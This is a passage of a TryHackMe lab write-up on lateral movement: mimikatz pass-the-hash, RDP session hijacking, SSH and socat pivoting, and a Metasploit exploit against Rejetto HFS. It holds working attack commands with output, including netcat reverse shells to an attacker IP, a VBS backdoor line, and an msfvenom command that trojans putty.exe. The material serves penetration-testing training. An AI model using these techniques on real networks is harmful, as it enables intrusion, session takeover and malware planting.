mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.4 5556" 
user    : t1_toby.beck 
domain  : za.tryhackme.com 
program : c:\tools\nc64.exe -e cmd.exe 10.150.74.4 5556 
impers. : no 
NTLM    : 533f1bd576caa912bdb9da284bbc60fe 
  |  PID  10484 
  |  TID  6200 
  |  LSA Process was already R/W 
  |  LUID 0 ; 16239590 (00000000:00f7cbe6) 
  \_ msv1_0   - data copy @ 0000026E6A975270 : OK ! 
  \_ kerberos - data copy @ 0000026E6B84CA18 
   \_ aes256_hmac       -> null 
   \_ aes128_hmac       -> null 
   \_ rc4_hmac_nt       OK 
   \_ rc4_hmac_old      OK 
   \_ rc4_md4           OK 
   \_ rc4_hmac_nt_exp   OK 
   \_ rc4_hmac_old_exp  OK 
   \_ *Password replace @ 0000026E6B7F3498 (32) -> null 
 
mimikatz #   
```

Back at the netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ nc -lvnp 5556
listening on [any] 5556 ...
connect to [10.150.74.4] from (UNKNOWN) [10.200.74.249] 50974
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\t2_felicia.dean

C:\Windows\system32>winrs.exe -r:THMIIS.za.tryhackme.com cmd
winrs.exe -r:THMIIS.za.tryhackme.com cmd
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\t1_toby.beck>whoami
whoami
za\t1_toby.beck

C:\Users\t1_toby.beck>exit
exit

C:\Windows\system32>exit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ 
```

Note again that our original user is shown by `whoami`!

---------------------------------------------------------------------------

### Task 6: Abusing User Behaviour

Under certain circumstances, an attacker can take advantage of actions performed by users to gain further access to machines in the network. While there are many ways this can happen, we will look at some of the most common ones.

#### Abusing Writable Shares

It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.

One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.

![Network Share](Images/Network_Share.png)

The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine. If we, as attackers, have write permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.

Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).

#### Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

```text
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

#### Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.

#### RDP hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:

![Run as Admin](Images/Run_as_Admin.png)

From there, run `PsExec64.exe` (available at `C:\tools\`):

`PsExec64.exe -s cmd.exe`

To list the existing sessions on a server, you can use the following command:

```bat
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a **Disc** state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.

To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:

`tscon 3 /dest:rdp-tcp#6`

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

As a result, we'll resume luke's RDP session and connect to it immediately.

**Note**: Windows Server 2019 won't allow you to connect to another user's session without knowing its password.

#### Let's Get to Work

To complete this exercise, you will need to connect to THMJMP2 using a new set of credentials obtained from `http://distributor.za.tryhackme.com/creds_t2` (Notice that **this link is different from the other tasks**).

Your credentials have been generated:

- Username: `t2_jessica.richards`
- Password: `o6R9PfosU`

Once you have your credentials, connect to THMJMP2 via RDP:

`xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD`

These credentials will grant you administrative access to THMJMP2.

For this task, we'll work on hijacking an RDP session. If you are interested in trying backdooring exe or other files, you can find some exercises about this in the [Windows Local Persistence](https://tryhackme.com/jr/windowslocalpersistence) room.

Follow the instructions to hijack `t1_toby.beck`'s RDP session on THMJMP2 to get your flag.

**Note**: When executing query session, you'll see several users named `t1_toby.beck` followed by a number. These are just identical copies of the same user, and you can hijack any of them (you don't need to hijack them all). Make sure you hijack a session marked as **disconnected (Disc.)** to avoid interfering with other users.

---------------------------------------------------------------------------

We start by connecting with RDP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ xfreerdp /v:thmjmp2.za.tryhackme.com /cert:ignore /u:'t2_jessica.richards' /p:'o6R9PfosU' /h:1024 /w:1500 +clipboard 
[08:55:08:321] [6741:6742] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[08:55:08:322] [6741:6742] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[08:55:08:539] [6741:6742] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[08:55:08:539] [6741:6742] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[08:55:09:128] [6741:6742] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_WARNING [LOGON_MSG_SESSION_CONTINUE]
<---snip--->
```

First we escalate to SYSTEM with PsExec from an **elevated** cmd.exe shell

```bat
C:\Windows\system32>C:\tools\PsExec64.exe -s -i cmd.exe

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

```

Then in the new window, we list the user sessions

```bat
C:\Windows\system32>query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console                                     1  Conn
                   t1_toby.beck5             2  Disc
>rdp-tcp#18        t2_jessica.richards       3  Active
                   t1_toby.beck              4  Disc
                   t1_toby.beck1             5  Disc
                   t1_toby.beck2             6  Disc
                   t1_toby.beck3             7  Disc
                   t1_toby.beck4             8  Disc
                   t2_charlie.holland        9  Disc
 rdp-tcp                                 65536  Listen
```

Next, we take over toby's session #2

```bat
C:\Windows\system32>tscon 2 /dest:rdp-tcp#18
```

#### What flag did you get from hijacking t1_toby.beck's session on THMJMP2?

We switch RDP session and in the new RDP session, the Paint application is open with the flag.

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------

### Task 7: Port Forwarding

Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching SMB, RDP, WinRM or RPC ports.

To go around these restrictions, we can use port forwarding techniques, which consist of using any compromised host as a jump box to pivot to other hosts. It is expected that some machines will have more network permissions than others, as every role in a business will have different needs in terms of what network services are required for day-to-day work.

#### SSH Tunnelling

The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called **SSH Tunneling**. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system.

SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.

![SSH Tunneling 1](Images/SSH_Tunneling_1.png)

Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case.

#### SSH Remote Port Forwarding

In our example, let's assume that firewall policies block the attacker's machine from directly accessing port 3389 on the server. If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine).

As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

![SSH Tunneling 2](Images/SSH_Tunneling_2.png)

A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP session directly from there. The answer is simple: in a situation where we only have console access to PC-1, we won't be able to use any RDP client as we don't have a GUI. By making the port available to your attacker's machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.

Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:

```bash
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

This will establish an SSH session from PC-1 to `1.1.1.1` (Attacker PC) using the `tunneluser` user.

Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need to run the `ssh` command with the `-N` switch to prevent the client from requesting one, or the connection will exit immediately. The `-R` switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers don't need to match, although they do in this example.

The command itself won't output anything, but the tunnel will depend on the command to be running. Whenever we want, we can close the tunnel by pressing CTRL+C as with any other command.

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

```bash
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

#### SSH Local Port Forwarding

**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.

![SSH Tunneling 3](Images/SSH_Tunneling_3.png)

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:

```bash
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

The command structure is similar to the one used in remote port forwarding but uses the `-L` option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (`*:80`) and the remote socket to connect to from the attacker's PC perspective (`127.0.0.1:80`).

Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded.

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Administrative privileges are needed for this:

```bat
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at `http://2.2.2.2:80` and see the website published by the attacker's machine.

#### Port Forwarding With socat

In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.

The basic syntax to perform port forwarding using socat is much simpler. If we wanted to open port 1234 on a host and forward any connection we receive there to port 4321 on host 1.1.1.1, you would have the following command:

```bash
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

The `fork` option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing. If you don't include it, socat will close when the first connection made is finished.

Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:

```bash
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:

![Socat Tunneling 1](Images/Socat_Tunneling_1.png)

As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:

```bat
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:

```bash
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker's machine:

![Socat Tunneling 2](Images/Socat_Tunneling_2.png)

#### Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, **dynamic port forwarding** allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**.

Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command:

```bash
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using **proxychains**. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf` on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:

```text
[ProxyList]
socks4  127.0.0.1 9050
```

The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.

If we now want to execute any command through the proxy, we can use proxychains:

```bash
proxychains curl http://pxeboot.za.tryhackme.com
```

Note that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so your mileage might vary.

#### Let's Get to Work

**Note**: Since you will be doing SSH connections from the lab network back to your attacker machine using the `tunneluser` for this task, we **highly encourage** you to use the Attackbox or a VM instead of your actual machine. Instructions have been given on creating a user that won't allow running commands or transferring files via SSH/SCP, so be sure to follow them as provided. It is also recommended to create a strong password for `tunneluser` and make sure it is a unique and discardable password, not your actual password in this or any other platform.

To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from `http://distributor.za.tryhackme.com/creds`. If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Your credentials have been generated:

- Username: `natasha.howells`
- Password: `Donald2005`

Our first objective will be to connect via RDP to THMIIS. If we try to connect directly from our attacker machine, we will find that port 3389 has been filtered via a firewall and is therefore not available directly. However, the port is up and running but can only be accessed from THMJMP2. By using socat, which is available on `C:\tools\socat\` on THMJMP2, we will forward the RDP port to make it available on THMJMP2 to connect from our attacker's machine.

To do so, we will run socat with the following parameters:

```bat
C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Note that we can't use port `3389` for our listener since it is already being used in THMJMP2 for its own RDP service. Feel free to change the listener port (`13389`) to a different number to avoid clashing with other students. In a typical setup, you'd have to add a firewall rule to allow traffic through the listener port, but **THMJMP2 has its firewall disabled for your convenience**.

Once the listener has been set up, you should be able to connect to THMIIS via RDP from your attacker machine by pivoting through your socat listener at THMJMP2:

```bash
user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

Once connected, you should get a flag from t1_thomas.moore's desktop on THMIIS.

#### Tunnelling Complex Exploits

The THMDC server is running a vulnerable version of Rejetto HFS. The problem we face is that firewall rules restrict access to the vulnerable port so that it can only be viewed from THMJMP2. Furthermore, outbound connections from THMDC are only allowed to machines in its local network, making it impossible to receive a reverse shell directly to our attacker's machine. To make things worse, the Rejetto HFS exploit requires the attacker to host an HTTP server to trigger the final payload, but since no outbound connections are allowed to the attacker's machine, we would need to find a way to host a web server in one of the other machines in the same network, which is not at all convenient. We can use port forwarding to overcome all of these problems.

First, let's take a look at how the exploit works. First, it will connect to the HFS port (`RPORT` in Metasploit) to trigger a second connection. This second connection will be made against the attacker's machine on `SRVPORT`, where a web server will deliver the final payload. Finally, the attacker's payload will execute and send back a reverse shell to the attacker on `LPORT`:

![Exploit Tunneling 1](Images/Exploit_Tunneling_1.png)

With this in mind, we could use SSH to forward some ports from the attacker's machine to THMJMP2 (SRVPORT for the web server and LPORT to receive the reverse shell) and pivot through THMJMP2 to reach RPORT on THMDC. We would need to do three port forwards in both directions so that all the exploit's interactions can be proxied through THMJMP2:

![Exploit Tunneling 2](Images/Exploit_Tunneling_2.png)

Rejetto HFS will be listening on port 80 on THMDC, so we need to tunnel that port back to our attacker's machine through THMJMP2 using remote port forwarding. Since the attackbox has port 80 occupied with another service, we will need to link port 80 on THMDC with some port not currently in use by the attackbox. Let's use port 8888. When running ssh in THMJMP2 to forward this port, we would have to add `-R 8888:thmdc.za.tryhackme.com:80` to our command.

For SRVPORT and LPORT, let's choose two random ports at will. For demonstrative purposes, we'll set `SRVPORT=6666` and `LPORT=7878`, but be sure to use different ports as the lab is shared with other students, so if two of you choose the same ports, when trying to forward them, you'll get an error stating that such port is already in use on THMJMP2.

To forward such ports from our attacker machine to THMJMP2, we will use local port forwarding by adding `-L *:6666:127.0.0.1:6666` and `-L *:7878:127.0.0.1:7878` to our ssh command. This will bind both ports on THMJMP2 and tunnel any connection back to our attacker machine.

Putting the whole command together, we would end up with the following:

```bat
C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

**Note**: If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the `lateralmovementandpivoting` network as your ATTACKER_IP, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called `lateralmovement`, so you should be able to get the right IP address by running `ip add show lateralmovement`:

![IP Network Config](Images/IP_Network_Config.png)

Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:

```bash
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp

msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666

msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

There is a lot to unpack here:

- The **LHOST** parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker's machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since THMDC won't be able to reach us, we need to force the payload to connect back to THMJMP2, but we need the listener to bind to the attacker's machine on `127.0.0.1`. To this end, Metasploit provides an optional parameter `ReverseListenerBindAddress`, which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to `127.0.0.1` on the attacker's machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).
- Our exploit must also run a web server to host and send the final payload back to the victim server. We use **SRVHOST** to indicate the listening address, which in this case is `127.0.0.1`, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at **SRVPORT** back to the attacker's machine.
- The **RHOSTS** is set to point to `127.0.0.1` as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. **RPORT** is set to `8888`, as any connection sent to that port on the attacker machine will be forwarded to port `80` on THMDC.

After launching the exploit, you will receive a shell back at the attacker's machine. You will find a flag on `C:\hfs\flag.txt`.

---------------------------------------------------------------------------

#### What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?

We start by creating the tunneluser on our Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ sudo useradd tunneluser -m -d /home/tunneluser -s /bin/true
[sudo] password for kali: 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ sudo passwd tunneluser 
New password: 
Retype new password: 
passwd: password updated successfully
```

Next, we connect with SSH to the jump server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ ssh za\\natasha.howells@thmjmp2.za.tryhackme.com
za\natasha.howells@thmjmp2.za.tryhackme.com's password: 
Microsoft Windows [Version 10.0.14393] 
(c) 2016 Microsoft Corporation. All rights reserved. 

za\natasha.howells@THMJMP2 C:\Users\natasha.howells>  
```

Then we setup port forwarding on the jump server from local port 12345 to port 3380 on the web server

```bat
za\natasha.howells@THMJMP2 C:\Users\natasha.howells>cd C:\tools 

za\natasha.howells@THMJMP2 C:\tools>cd socat 

za\natasha.howells@THMJMP2 C:\tools\socat>socat TCP4-LISTEN:12345,fork TCP4:THMIIS.za.tryhackme.com:3389  
```

Now we can RDP via the jump server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ xfreerdp /v:THMJMP2.za.tryhackme.com:12345 /u:t1_thomas.moore /p:MyPazzw3rd2020
[09:51:06:143] [35008:35009] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[09:51:06:143] [35008:35009] [WARN][com.freerdp.crypto] - CN = THMIIS.za.tryhackme.com
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - The hostname used for this connection (THMJMP2.za.tryhackme.com:12345) 
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - Common Name (CN):
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] -      THMIIS.za.tryhackme.com
[09:51:06:153] [35008:35009] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for THMJMP2.za.tryhackme.com:12345 (RDP-Server):
        Common Name: THMIIS.za.tryhackme.com
        Subject:     CN = THMIIS.za.tryhackme.com
        Issuer:      CN = THMIIS.za.tryhackme.com
        Thumbprint:  ef:c8:7a:a0:77:24:99:1d:c7:3b:f2:f8:80:bc:14:29:1e:7e:b5:11:c2:f1:b1:8e:60:aa:1e:e6:08:65:2e:d8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[09:51:13:442] [35008:35009] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[09:51:13:442] [35008:35009] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[09:51:13:605] [35008:35009] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[09:51:13:606] [35008:35009] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[09:51:16:935] [35008:35009] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
<---snip--->
```

On the Desktop in the RDP session there is a `flag.bat` script that runs the `flag.exe` file

```bat
flag.exe
pause
```

Double-clicking on the batch scripts gives us the flag in a new window

```bat
C:\Users\t1_thomas.moore\Desktop>flag.exe
THM{<REDACTED>}


C:\Users\t1_thomas.moore\Desktop>pause
Press any key to continue . . .
```

Answer: `THM{<REDACTED>}`

#### What is the flag obtained using the Rejetto HFS exploit on THMDC?

We make sure to use unique port values as follows:

|Port|THM Value|My value|
|----|----|----|
|LPORT|7878|18787|
|SRVPORT|6666|15555|
|RPORT|8888|19999|

We also make sure our SSH server is running on our Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ sudo systemctl start ssh 
[sudo] password for kali: 
```

We are connected by SSH from the previous exercise and can setup port forwarding with OpenSSH

```bat
za\natasha.howells@THMJMP2 C:\tools\socat>ssh tunneluser@10.150.74.4 -R 19999:thmdc.za.tryhackme.com:80 -L *:15555:127.0.0.1:15555 -L *:18787:127.0.0.1:18787 -N 
The authenticity of host '10.150.74.4 (10.150.74.4)' can't be established. 
ED25519 key fingerprint is SHA256:2aoEvkx/OcF18TPXVxkGMndSMfIp1cjDvqsWpHrvfb4. 
This key is not known by any other names 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.150.74.4' (ED25519) to the list of known hosts. 
tunneluser@10.150.74.4's password:   
```

Next, we start Metasploit and set parameters

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Networks/Easy/Lateral_Movement_and_Pivoting]
└─$ msfconsole -q 
msf > use rejetto_hfs_exec

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

[*] Using exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
lhost => thmjmp2.za.tryhackme.com
msf exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf exploit(windows/http/rejetto_hfs_exec) > set lport 18787
lport => 18787
msf exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf exploit(windows/http/rejetto_hfs_exec) > set srvport 15555
srvport => 15555
msf exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf exploit(windows/http/rejetto_hfs_exec) > set rport 19999
rport => 19999
msf exploit(windows/http/rejetto_hfs_exec) > exploit
[*] Started reverse TCP handler on 127.0.0.1:18787 
[*] Using URL: http://thmjmp2.za.tryhackme.com:15555/riEVrNkBS5PC
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /riEVrNkBS5PC
[!] Tried to delete %TEMP%\vRLWAe.vbs, unknown result
[*] Command shell session 1 opened (127.0.0.1:18787 -> 127.0.0.1:39712) at 2026-05-01 10:21:47 +0200
[*] Server stopped.


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\hfs>
-----
 

C:\hfs>
C:\hfs>type flag.txt
type flag.txt
THM{<REDACTED>}
C:\hfs>
```

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------

### Task 8: Conclusion

In this room, we have discussed the many ways an attacker can move around a network once they have a set of valid credentials. From an attacker's perspective, having as many different techniques as possible to perform lateral movement will always be helpful as different networks will have various restrictions in place that may or may not block some of the methods.

While we have presented the most common techniques in use, remember that anything that allows you to move from one host to another is lateral movement. Depending on the specifics of each network, other paths could be viable.

Should you be interested in more tools and techniques, the following resources are available:

